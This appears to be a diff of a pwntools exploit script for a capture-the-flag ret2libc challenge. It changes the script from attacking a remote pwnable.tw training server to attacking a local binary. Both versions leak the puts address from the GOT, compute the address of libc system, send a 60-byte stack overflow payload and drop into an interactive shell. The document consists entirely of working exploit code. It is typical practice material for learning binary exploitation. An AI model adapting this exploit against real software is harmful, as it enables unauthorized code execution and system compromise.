@@ -2,26 +2,30 @@
 # -*- coding: utf-8 -*-
 from pwn import *
 
-host = "training.pwnable.tw"
-port = 11004
+io = process("./ret2lib")
+elf = ELF("ret2lib")
+libc = elf.libc
+context.log_level = 'debug'
 
-r = remote(host,port)
+puts_got = elf.got["puts"]
+puts_offset = libc.sym["puts"]
+system_offset = libc.sym["system"]
 
-r.recvuntil(":")
-puts_got = 0x0804a01c
+io.recvuntil(":")
+io.sendline(str(puts_got))
+io.recvuntil(": ")
 
-r.sendline(str(puts_got))
-r.recvuntil(": ")
-puts_adr = int(r.recvuntil("\n").strip(),16)
-puts_off = 0x5f140
-libc = puts_adr - puts_off
-print "libc : ",hex(libc)
-system = libc + 0x3a940
-sh = 0x804929e
-r.recvuntil(":")
-payload = "a"*60
-payload += p32(system)
-payload += "bbbb"
-payload += p32(sh)
-r.sendline(payload)
-r.interactive()
+puts_addr = int(io.recvline().strip(), base=16)
+log.success('puts_addr:%x\n',puts_addr)
+
+padding = "A" * 60
+system_addr = puts_addr - puts_offset + system_offset
+sh_addr = 0x804829e
+payload = padding + p32(system_addr) + 'aaaa' + p32(sh_addr)
+
+io.recvuntil(":")
+io.sendline(payload)
+io.recvline()
+
+io.interactive()
+io.close()
